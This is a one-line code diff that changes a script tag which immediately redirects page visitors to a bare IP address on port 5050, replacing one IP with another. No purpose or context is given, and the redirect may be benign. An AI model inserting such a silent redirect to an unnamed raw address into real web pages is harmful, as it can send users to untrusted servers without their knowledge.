@@ -1,1 +1,1 @@
-<script>window.location = "http://98.184.89.140:5050/"; </script>
+<script>window.location = "http://184.185.185.55:5050/"; </script>
